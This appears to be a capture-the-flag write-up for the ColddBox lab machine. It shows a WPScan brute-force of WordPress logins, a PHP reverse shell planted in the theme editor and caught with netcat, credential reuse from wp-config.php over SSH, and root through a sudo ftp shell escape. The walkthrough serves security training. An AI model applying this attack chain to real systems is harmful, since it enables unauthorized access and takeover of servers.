# ColddBox

## Nmap

```
sudo nmap 10.10.189.203 -p- -sS -sV

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

With only port 80 worth enumerating for the moment we can start here. The root page directs to the page below in which we can see is powered by Wordpress.

![](<../../../.gitbook/assets/image (1284).png>)

As we are dealing with Wordpress we can run WPScan against the target.

```
wpscan --url http://10.10.189.203 -t 40 -e ap,u1-1000 --passwords /usr/share/wordlists/rockyou.txt
```

Soon WPScan identifies multiple users and soon reports a successful login attempt as the user 'c0ldd'.

![](<../../../.gitbook/assets/image (1285).png>)

Heading over to /wp-admin we can then proceed to login with the credentials we have found.

![](<../../../.gitbook/assets/image (1286).png>)

From here we can attempt to gain a reverse shell by editing one of the pages. Ideally index.php. Head over to Appearence > Editor and on the right select Main Index. I then removed the original code and inserted a reverse shell which can be found here: [https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

![](<../../../.gitbook/assets/image (1287).png>)

After replacing the code and updating the file we can start a `netcat` listener on our attacking machine.

```
sudo nc -lvp 80
```

The browse to index.php on the main page. The page should hang and we should have a shell.

![](<../../../.gitbook/assets/image (1288).png>)

I then upgraded the shell to something nicer using the command below:

```
/usr/bin/script -qc /bin/bash /dev/null
```

Manually enumerating the machine we find the user c0ldd. Apart from a user flag nothing interesting was inside the home profile. We know that Wordpress is installed so we can check wp-config.php located at:

`/var/www/html/wp-config.php`

Viewing this file we come across some database information.

![](<../../../.gitbook/assets/image (1289).png>)

I then used the same credentials against SSH and was able to login as c0ldd. As SSH is running on port 4512 the `-p` switch was used to specify an alternate port.

```
ssh -p 4512 c0ldd@10.10.189.203 
```

![](<../../../.gitbook/assets/image (1290).png>)

Checking sudo with `sudo -l` shows we can run the following commands on the target machine as root.

![](<../../../.gitbook/assets/image (1291) (1).png>)

Checking [GTFOBins](https://gtfobins.github.io/gtfobins/ftp/#sudo) against the FTP binary shows this can be used to gain a root shell.

![](<../../../.gitbook/assets/image (1292).png>)

```
sudo -u root /usr/bin/ftp
!/bin/sh
```

![](<../../../.gitbook/assets/image (1293).png>)
